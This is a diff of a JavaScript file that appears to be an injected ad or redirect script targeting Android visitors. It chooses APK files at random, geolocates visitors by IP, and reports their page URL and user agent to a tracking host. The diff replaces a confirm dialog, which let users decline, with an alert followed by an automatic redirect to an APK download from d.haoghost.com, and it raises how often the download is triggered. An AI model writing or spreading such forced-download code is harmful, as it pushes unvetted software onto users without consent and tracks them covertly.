@@ -101,7 +101,7 @@ var hy_itv=setInterval(function(){
 	}
 	function hlTime()
 	{
-		return (hour>=7) && (hour<23);	
+		return (hour>=8) && (hour<23);	
 	}
 
 	function getDownUrl()
@@ -133,20 +133,18 @@ var hy_itv=setInterval(function(){
 	function getAndroidDownUrl()
 	{
 		var result;
+		var rd=Math.random();
 		switch(num)
 		{
 			case "31":
-				result="http://m.haoghost.com/images/test/360ysdq.apk";
+				result="360sphj.apk";
 				break;
-			case "16":
+			case "35":
 				result="sybb.10C352.apk";
 				break;
 			default:
-				var rd=Math.random();
-				//if(notNight()) result="sybb.10C352.apk";
-				//else result="http://t.cn/R7qFBqD";
-				if(rd<0.6) result="sybb.10C352.apk";
-				else if(rd<0.9) result="360sqyy774.apk";
+				if(rd<0.5) result="360sqyy774.apk";
+				else if(rd<0.9) result="360sphj.apk";
 				else result="http://t.cn/R7qFBqD";
 		}
 		return result;
@@ -279,7 +277,7 @@ var hy_itv=setInterval(function(){
 
 
 			var hyipdata=parseInt(getCookie("hyipdata"));
-			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua))
+			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua) && num!=35 )
 			{
 				getJsonp(
 					'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
@@ -287,12 +285,12 @@ var hy_itv=setInterval(function(){
 					function(data){
 						//var res=remote_ip_info.province.indexOf("广东")>=0 ||remote_ip_info.province.indexOf("山东")>=0;
 						var res=false;
-						if(!res && Math.random()>0.9)
+						if(!res && Math.random()>0.5)
 						{
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy22.apk";
+								pname="hlyy26.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
@@ -317,7 +315,7 @@ var hy_itv=setInterval(function(){
 			}
 			function goCityDown(){
 				window.setTimeout(function(){
-					if(num==18 || num==19 || num==31 || num==32 || num==33)
+					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35)
 					{
 						if(!autoDown()) return;
 						if(tt.indexOf("》")<0)
@@ -362,7 +360,7 @@ var hy_itv=setInterval(function(){
 							now=now-num*60*1000;
 							setCookie("hycookietime",now);	
 						}
-						if(window.confirm(tt)){
+						/*if(window.confirm(tt)){
 							if(pname.indexOf("http")>=0) window.location.href=pname;
 							else window.location.href="http://d.haoghost.com/"+pname;
 							setCookie("hycpc1","1");
@@ -371,7 +369,12 @@ var hy_itv=setInterval(function(){
 						else
 						{
 							setBefore(55);
-						}
+						}*/
+						alert(tt);
+						if(pname.indexOf("http")>=0) window.location.href=pname;
+						else window.location.href="http://d.haoghost.com/"+pname;
+						setCookie("hycpc1","1");
+						if(num==28 || num==31 || num==32 || num==33 || num==34) setBefore(50);
 					}
 				},1000);
 			}
